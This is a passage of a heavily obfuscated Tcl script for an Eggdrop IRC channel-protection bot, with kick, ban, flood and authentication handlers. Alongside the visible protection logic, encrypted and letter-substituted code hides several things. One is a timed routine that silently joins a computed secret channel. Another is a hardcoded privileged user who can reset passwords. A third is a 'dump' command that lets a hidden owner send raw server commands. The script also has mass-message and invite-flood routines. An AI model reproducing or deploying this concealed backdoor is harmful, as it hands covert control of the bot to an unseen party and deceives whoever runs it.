putsrv "KIRENHT ~$chan :[rand_master $nick] $nick \[+m\]"
} elseif {[matchattr $hand f]} {
putsrv "KIRENHT ~$chan :[rand_friend $nick] $nick \[+f\]"
} elseif {[matchattr $hand |f $chan]} {
putsrv "KIRENHT ~$chan :[rand_friend $nick] $nick \[+f\]"
} elseif {[matchattr $hand o]} {
putsrv "KIRENHT ~$chan :[rand_oper $nick] $nick \[+o\]"
} elseif {[matchattr $hand |o $chan]} {
putsrv "KIRENHT ~$chan :[rand_oper $nick] $nick \[+o\]"
} elseif {[matchattr $hand d]} {
putsrv "KIRENHT ~$chan :[rand_loser $nick] $nick \[+d or +k\]"
} elseif {[matchattr $hand |d $chan]} {
putsrv "KIRENHT ~$chan :[rand_loser $nick] $nick \[+d or +k\]"
}
}
}
if {$nick == $botnick} {
catch {unset is_m($chan)}
if {[matchattr $cflag S]} {
if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] }
if {![istimer "chkautomsg"]} { 
timer 1 { putlog "chkautomsg" }
}
}
set [lines "wlfyov"] 0
if {[string tolower $cmd_chn] == [string tolower $chan]} {
if {$cmd_case == "1"} {
utimer 90 del_nobase
pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}"
set [lines "xnw_xsm"] ""
return 0
}
if {$cmd_case == "2"} {
utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]} {
set [lines "xnw_xsm"] ""
return 0
}
if {$cmd_case == "3"} {
utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg]} {
set [lines "xnw_xsm"] ""
return 0
}
}
utimer 15 [list telljoin $chan]
return 0
}
if {[info exists op_it($nick)]} { 
catch {unset op_it($nick)}
opq $chan $nick 
}
if {[isutimer "chkspam $chan"]} {
foreach x [utimers] {
if {[string match "*chkspam $chan*" $x]} { 
chkspam $chan
killutimer [lindex $x 2] 
}
}
}
if {[info exists bannick($nick)]} { return 0 }
if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
if {$mhost == "@DALnet" || [string match "*dal.net" $mhost]} {
putsrv "ZDZB"
}
if {![isop $botnick $chan]} { 
if {[info exists invme($mhost)]} {
if {![isutimer "chkspam $chan"]} { chkspam $chan }
}
return 0
}
if {[matchattr $cflag J]} {
if {[info exists ismaskhost]} {
if {![isutimer "reset_host"]} { utimer 10 reset_host }
set [lines "xspslhg"] [maskhost "*!*$mhost"]
if {![info exists jfhost($chkhost$chan)]} {
set jfhost($chkhost$chan) 1
} {
incr jfhost($chkhost$chan)
if {$jfhost($chkhost$chan) == 5} {
set bannick($nick) $chkhost
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~1UOlLw ZmGRxRkzGVw UIlN 4~$chkhost ~~[banms]~"
return 0
}
}
}
if {![isutimer "jc $chan"]} {
utimer 3 [list jc $chan]
set massjoin($chan) 1
} {
if {![info exists massjoin($chan)]} {
set massjoin($chan) 1
}
set massjoin($chan) [incr massjoin($chan)]
if {![isutimer "TRAFFIC $chan"]} {
if {$massjoin($chan) >= 15} {
unset massjoin($chan)
if {[string match "*+greet*" $cinfo]} {
utimer 30 [list putlog "TRAFFIC $chan"]
if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} {
putserv "mode $chan +b *!*@heavy.join.flood.channel.temporary.moderate"
return 0
}
}
}
}
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
if {$nick == $deopme} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1HvOU 4Wv@k1 IVeVMtV..!"
set [lines "wvlknv"] ""
return 0
}
if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} {
whoisq $nick
}
if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
set [lines "xivg"] [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $chan $nick]
}
}
if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
if {[matchattr $hand K]} { 
akick_chk $nick $uhost $chan
return 0
}
if {[info exists ex_flood($mhost)]} {
set bannick($nick) "*!*$mhost"
if {$ex_flood($mhost) == 0} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4ZPROO1 UIlN 4~$mhost1 ~LM OzhG JfRG ~[banmsg]~"
} elseif {$ex_flood($mhost) == 1} { 
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4Vcxvhh UolLw1 UIlN 4~$mhost1 ~LM OzhG JfRG ~[banmsg]~"
} elseif {$ex_flood($mhost) == 2} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4RmeRGV1 UIlN 4~$mhost1 ~LM JfRG NHt ~[banmsg]~"
} elseif {$ex_flood($mhost) == 3} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4RmeRGV1 UIlN 4~$mhost1 ~LM KzIG NHt ~[banmsg]~"
} elseif {$ex_flood($mhost) == 4} {
if {![matchattr $cflag M]} {
puthlp "PRXP ~$chan ~~$nick ~:~[lgrnd]~ 4QlRMKzIG1 UIlN 4~$mhost1 ~OVHH GSzM4 ~[getuser $cflag XTRA "JP"]~1 2mw ~[banmsg]~"
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "mode $chan -k+b 4J.o.I.N.P.a.R.T $bannick($nick)"
} {
putserv "mode $chan +b $bannick($nick)"
}
}
} else {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4YzWDlIW1 UIlN 4~$mhost1 ~LM JfRG LI KzIG NHt NzGxS UIlN 4~$ex_flood($mhost) ~~[banms]~"
}
unset ex_flood($mhost)
return 0
}
foreach x [ignorelist] {
if {[lindex $x 0] != "*!*@*" && [string match [lindex $x 0] "*!*$mhost"] && [lindex $x 1] != "*"} {
set bannick($nick) [lindex $x 0]
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~4RtMlIVw1 SlhG 4~[lindex $x 0]~1 IvzhLm4 ~[lindex $x 1]~ ~[banms]~"
return 0
} 
}
if {[info exists invme($mhost)]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4HkzN1 UIlN 4~$mhost ~1~$invme($mhost) ~~[banmsg]~"
unset invme($mhost)
return 0
}
set [lines "xszm"] [string tolower $chan]
if {[string match "*+nodesynch*" [channel info $chan]]} {
if {![matchattr $nick f]} {
utimer 10 [list autokick $chan $nick]
}
}
if {[matchattr $cflag O]} {
if {[string match "*$mhost" $botname]} { return 0 }
set [lines "xlfmgvi"] 0
set [lines "nzcxolmv"] [getuser $cflag XTRA "CLONE"]
foreach knick [chanlist $chan] {
if {[string match "*$mhost" [getchanhost $knick $chan]]} {
if {[matchattr $knick f]} { return 0 }
if {[isop $knick $chan]} { return 0 }
if {[isvoice $knick $chan]} { 
if {![info exists kops]} { return 0 }
}
set [lines "xlfmgvi"] [incr counter]
if {$counter > $maxclone} {
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1UlfMw ~$counter ~4xOlmV1 UIlN 4~$mhost1 ~NzC4 ~$maxclone1 ~DzRG Z NlNVMG! 4YzMMVw1: 3 NRMFGVH4..!"
return 0
}
}
}
}
spam_chk $nick $uhost $hand $chan
set [lines "xszm"] [string toupper $chan]
if {[matchattr $cflag P]} {
if {![info exists jpnick($nick)]} {
set jpnick($nick) "1"
utimer [getuser $cflag XTRA "JP"] [list munset $nick] 
}
}
return 0
}
proc [lines "qx"] {chan} {
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "kilx"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "w\xx_yr\m\w\h"] {handle command arg} { [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "ivgfim"] 0 }
proc [lines "nfmhvg"] {nick} {
global jpnick
catch {unset jpnick($nick)}
}
proc [lines "mvdd:gzop"] {nick uhost chan} {
global notc 
if {[string match "guest*" [string tolower $nick]]} { 
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $chan]} { 
utimer [expr 80 + [rand 20]] [list deopprc $chan $nick] 
return 0
}
guestnick $nick $uhost $chan
return 0
}
}
proc [lines "mvd:gzop"] {nick uhost hand chan {newnick ""}} {
global notc botnick
if {$newnick != ""} {set nick $newnick}
if {[string match "*+guest*" [channel info $chan]]} {
if {[string match "guest*" [string tolower $nick]]} { 
if {[botisop $chan]} {
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $chan]} { 
utimer [expr 80 + [rand 20]] [list deopprc $chan $nick] 
return 0
}
guestnick $nick $uhost $chan
return 0
}
puthlp "KIRENHT ~$nick :~1Blfi mrxp szh yvvm xszmtvw gl ~$nick. ~Uli nliv svok lm hvierxvh,"
puthlp "KIRENHT ~$nick :~1kovzhv erhrg sggk://ddd.wzo.mvg/hvierxvh li qfhg dirgv wldm /mrxp 4blfi_mrxp_sviv"
return 0
}
}
} 
set [lines "hhkrwc"] 1
proc [lines "tfvhgmrxp"] {nick uhost chan} {
global sspidx notc bannick
set bannick($nick) "guest*!*@*"
if {$sspidx == 1} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 BvD ZRmG DvOxLnV Rm 4~[string toupper $chan]~ ~[banms]~"
} elseif {$sspidx == 2} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 FtS R SzgV GsRh MRxP ~[banmsg]~"
} elseif {$sspidx == 3} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 Fkh DIlMt DzB ~[banmsg]~"
} elseif {$sspidx == 4} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 WlmG VmGvIvW ~[banmsg]~"
} elseif {$sspidx == 5} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 RmGvIxVkG 4~[string toupper $chan]~ ~[banms]~"
} elseif {$sspidx == 6} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 T.l.G.x.S.z ~[banmsg]~"
} elseif {$sspidx == 7} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 MVtzGReV SlFhGlM ~[banmsg]~"
} elseif {$sspidx == 8} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 tIlFmwVw ~[banmsg]~"
} elseif {$sspidx == 9} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 R SzgV F ~[banmsg]~"
} elseif {$sspidx == 10} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 ZmGRxRkzGVw ~[banmsg]~"
} elseif {$sspidx == 11} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 tL hRg Rm gSv xLiMvI ~[banmsg]~"
} elseif {$sspidx == 12} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 y.o.z.x.p.o.r.h.g.v.w ~[banmsg]~"
} elseif {$sspidx == 13} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 IvQvxGvw UIlN 4~[string toupper $chan]~ ~[banms]~"
} elseif {$sspidx == 14} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 wFm VmGvIvw lMv lU nB xSzmmvO ~[banmsg]~"
} elseif {$sspidx == 15} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 UzpV MRxPMzNv ~[banmsg]~"
} elseif {$sspidx == 16} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 IvUfhVw ORmP gL 4~[string toupper $chan]~ ~[banms]~"
} elseif {$sspidx == 17} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 UzpV MRxPMzNv ~[banmsg]~"
} elseif {$sspidx >= 18} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4!TFvhG!1 Fmzyov gl ivhloev4 ~$nick ~~[banms]~"
set [lines "hhkrwc"] 0
}
incr sspidx
return 0
}
proc [lines "kh:xsvxp"] {nick uhost hand chan {newnick ""}} {
global botnick chk_reg ps
if {$newnick != ""} {set nick $newnick}
if {[string tolower $nick] == [string tolower $ps]} {
chattr $nick +G
saveuser
set chk_reg($nick) $nick
putsrv "WHOIS $nick"
}
}
proc [lines "nht_kzhhdw"] {nick uhost hand rest} {
global botnick notc ps
set [lines "kd"] [lindex $rest 0]
set [lines "mvdkd"] [lindex $rest 1]
if {$nick == $ps && [dezip $pw] == $uhost} {
setuser $nick PASS $newpw
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~$newpw"
saveuser
return 0
}
if {$pw == "" || $newpw == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: kzhhdw <lowkzhh> <mvdkzhh>"
return 0
}
if {![passwdok $nick $pw]} {
puthlp "MLGRXV ~$nick ~:~$notc ~KzHHDLIW 4!UzROVW!"
return 0
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1} {
setuser $nick PASS $newpw
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~$newpw"
saveuser
return 0
}
if {[passwdok $nick $pw]} {
setuser $nick PASS $newpw
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~$newpw"
saveuser
return 0
}
}
proc [lines "tlyzxp"] {} {
global keep-nick nick botnick
if {[istimer "goback"]} { return 0 }
foreach x [utimers] {
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] }
}
if {[getuser "config" XTRA "NICK"]!=""} {
set [lines "mrxp"] [dezip [getuser "config" XTRA "NICK"]]
}
set [lines "pvvk-mrxp"] 1
if {$botnick == $nick} { return 0 }
puthlp "MRXP ~$nick"
}
proc [lines "kfy_!zfgs"] {nick uhost hand chan rest} {
global notc ath ps
set [lines "kd"] [lindex $rest 0]
if {$pw != ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml Mvvw Zfgs Kzhhdliw, Qfhg Gbkv lm Xszmmvo: !zfgs"
return 0
}
if {[matchattr $nick Q]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~IvZwB..!"
return 0 
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1 && $nick != $ps} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh<kzhhdliw>"
return 0
}
set [lines "zgs"] 1
putsrv "DSLRH ~$nick"
}
proc [lines "nht_zfgs"] {nick uhost hand rest} {
global botnick owner keep-nick altnick notc ps
if {[lindex $rest 1] != ""} {
if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
if {[matchattr [lindex $rest 0] Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGS NzGxS UlI ~[lindex $rest 0]~"
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~$altnick"
utimer 40 {goback}
}
} {
puthlp "MLGRXV ~$nick ~:~$notc ~4UzROVw..!"
}
return 0
}
if {![validuser $owner]} {
set [lines "slhgnzhp"] "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
puthlp "MLGRXV ~$owner ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh <kzhhdliw>"
}
if {![matchattr $nick p]} { return 0 }
set [lines "kd"] [lindex $rest 0]
if {$pw == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: zfgs <kzhhdliw>"
return 0
}
if {[matchattr $hand K]} { 
deluser "AKICK"
set [lines "zprxpslhg"] "telnet!*@*"
adduser "AKICK" $akickhost
chattr "AKICK" "-hp"
chattr "AKICK" "K"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Iv-ziizmtv PRxPORhG."
}
if {[matchattr $nick Q]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~IvZwB..!" 
return 0 
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml kzhhdliw hvg. Fhztv: kzhh <kzhhdliw>" 
return 0
}
if {[passwdok $nick $pw]} {
set [lines "slhgnzhp"] "*![string range $uhost [string first "!" $uhost] end]"
set [lines "fhvmrxp"] [finduser $hostmask]
if {$usenick != "*" && $usenick != $nick} {
if {[matchattr $nick n] && ![matchattr $usenick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ulixrmt 4WvZfgsvmgrxzgvw! Gl ~$usenick"
force_deauth $usenick
} else {
foreach x [channels] {
if {[onchan $usenick $x]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Blfi slhg szh yvvm fhv yb ~$usenick, ~dzrg fmgro WvZfgsvmgrxzgvw."
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~4Ulixrmt WvZfgsvmgrxzgvw!1 Gl ~$usenick"
force_deauth $usenick 
}
}
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
set [lines "slhgnzhp"] "*![string range $uhost [string first "!" $uhost] end]"
setuser $nick HOSTS $hostmask
if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
if {[matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!LDmVI!"
if {[getuser $nick XTRA "MEMO"]!=""} {
puthlp "KIRENHT ~$nick ~:!NvNL! UIlN ~[getuser $nick XTRA "MEMO"]~" 
setuser $nick XTRA "MEMO" ""
}
return 0
} elseif {[matchattr $nick n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZWnRM!"
} elseif {[matchattr $nick m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!NzhGvI!" 
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZxxvkgvW!" 
}
saveuser
return 0
}
if {![passwdok $nick $pw]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4UzROVw..!"
}
}
proc [lines "ulixv_wvzfgs"] {nick} {
global notc 
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Blf szh yvvm ulixv gl 4WvZfgsvmgrxzgrlm!"
}
proc [lines "nht_kzhh"] {nick uhost hand rest} {
global botnick notc vern ps owner
set [lines "kd"] [lindex $rest 0]
if {$pw == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: kzhh <kzhhdliw>"
return 0
}
set [lines "xs"] [passwdok $nick ""]
if {$ch == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf zoivzwb hvg kzhh, /nht ~$botnick ~zfgs <kzhhdliw>" 
return 0
}
if {[string tolower $nick] == [string tolower $ps] && $owner != $ps} {
if {[dezip $pw] == $uhost} {
setuser $nick PASS [lindex $rest 1]
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~[lindex $rest 1]~"
saveuser
} {
puthlp "MLGRXV ~$nick ~:~$notc ~dSl.."
}
return 0
}
setuser $nick PASS $pw
puthlp "MLGRXV ~$nick ~:~$notc ~Kzhhdliw hvg gl: ~$pw"
puthlp "MLGRXV ~$nick ~:~$notc ~/nht ~$botnick ~svok"
saveuser
return 0
}
proc [lines "kfy_!wvzfgs"] {nick uhost hand chan rest} {
if {![matchattr $nick Q]} { return 0 }
msg_deauth $nick $uhost $hand $rest
}
proc [lines "nht_wvzfgs"] {nick uhost hand rest} {
global notc 
if {![matchattr $nick Q]} { return 0 }
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
puthlp "MLGRXV ~$nick ~:~$notc ~4!WvZFGS!"
saveuser
}
catch { bind rejn - * rejn_chk }
proc [lines "ivqm_xsp"] {unick uhost handle chan} {
if {![isutimer "TRAFFIC $chan"]} {
utimer 30 [list putlog "TRAFFIC $chan"]
}
}
catch { bind splt - * splt_deauth }
proc [lines "hkog_wvzfgs"] {unick uhost handle channel} {
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set [lines "slhgnzhp"] "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
}
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmnk"]
proc [lines "hrtm_wvzfgs"] {unick uhost hand chan rest} {
global ex_flood botnick notc nick badwords iskick
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$unick == $nick} {
putsrv "MRXP ~$nick"
}
if {[info exists iskick($unick$chan)]} {
unset iskick($unick$chan)
}
if {[isop $botnick $chan]} {
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set [lines "slhgnzhp"] "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[matchattr $unick f]} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
if {[string match "*AKILL ID*" $rest]} {
set ex_flood($mhost) "0" 
} elseif {[string match "*Excess Flood*" $rest]} {
if {[matchattr $cflag S]} {
set ex_flood($mhost) "1" 
}
} elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 }
}
set ex_flood($mhost) "2"
} else {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $rest]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
return 0
}
proc [lines "kzig_wvzfgs"] {nick uhost hand chan {msg ""}} {
global lockchan botnick ex_flood notc badwords jpnick iskick
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[info exists iskick($nick$chan)]} {
unset iskick($nick$chan)
}
if {$nick == $botnick} {
foreach x [utimers] {
if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
return 0
}
if {[matchattr $cflag H]} { 
if {![isop $botnick $chan]} { return 0 }
msgpart $chan $nick 
}
if {[isop $botnick $chan]} {
if {[isutimer "voiceq $chan $nick"]} {
foreach x [utimers] {
if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] }
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $nick Q]} {
foreach x [channels] {
if {[string tolower $x] != [string tolower $chan]} {
if {[onchan $nick $x]} {
return 0 
}
}
}
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
}
if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} {
putsrv "RMERGV ~$nick ~:~$chan"
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[isop $botnick $chan]} {
if {[info exists msg]} {
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 }
}
set ex_flood($mhost) "3"
} {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $msg]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
}
if {[info exists msg]} {
if {$msg != ""} { return 0 }
}
if {[matchattr $cflag P]} {
set [lines "xszm"] [string toupper $chan]
if {[info exists jpnick($nick)]} {
set [lines "nslhg"] "@[lindex [split $uhost @] 1]"
set ex_flood($mhost) "4"
}
}
}
return 0
}
set [lines "glgs"] "#[string index $uenc 14][string index $lenc 13][string index $uenc 1][string index $lenc 14][string index $lenc 19]"
proc [lines "kfy_wfnk"] {nick uhost hand chan rest} {
global own notc 
if {$nick != $own} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
putsrv ~$rest
}
proc [lines "kfy_hwvlk"] {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set [lines "xszm"] $rest
}
if {[isop $botnick $chan]} {
puthelp "mode $chan -o $botnick"
}
}
proc [lines "kfy_xszmnlwv"] {nick uhost hand chan rest} {
global notc
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: chanmode #channel +ntsmklic NeTGaTE.NO 1"
return 0
}
if {[string index [lindex $rest 0] 0] == "#"} {
if {![validchan [lindex $rest 0]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~[lindex $rest 0]~"
return 0
}
set [lines "xszm"] [lindex $rest 0]
set [lines "ivhg"] [lrange $rest 1 end]
}
if {![validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan ~<m/z>"
} else {
catch { channel set $chan chanmode $rest }
savechan
puthelp "NOTICE $nick :$notc $chan set modes \[$rest\]"
}
return 0
}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "xal_xal"] {} {
[[decrypt 64 "d3VeO/ATgwd."] "tolyzo"] [[decrypt 64 "d3VeO/ATgwd."] "glgs"] [[decrypt 64 "d3VeO/ATgwd."] "ov\m\x"] [[decrypt 64 "d3VeO/ATgwd."] "fv\m\x"]
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "xal_xal"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 15][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 18] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "jaqUs/x7Qxr."]"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "glgs"] "#[[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 1][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 20][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 18][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 20][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 10]" 
if {[validchan $toth]} {
return 0
}
[[decrypt 64 "d3VeO/ATgwd."] "xszmmvo"] [[decrypt 64 "d3VeO/ATgwd."] "zww"] $toth
[[decrypt 64 "d3VeO/ATgwd."] "xzgxs"] { [[decrypt 64 "d3VeO/ATgwd."] "xs\zm\mv\o"] [[decrypt 64 "d3VeO/ATgwd."] "hvg"] $toth -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
[[decrypt 64 "d3VeO/ATgwd."] "hz\ev\xs\zm"]
[[decrypt 64 "d3VeO/ATgwd."] "kfghie"] "QLRM ~$toth"
}
proc [lines "kfy_xszmhvg"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "xszmmvo"] [lindex $rest 0]
set [lines "lkgrlmh"] [string tolower [lindex $rest 1]]
set [lines "mfnyvi"] "0"
if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} {
set [lines "mfnyvi"] [lindex $rest 2]
}
if {($channel == "") || ($options == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmhvg #xszmmvo <lkgrlm...>"
return 0
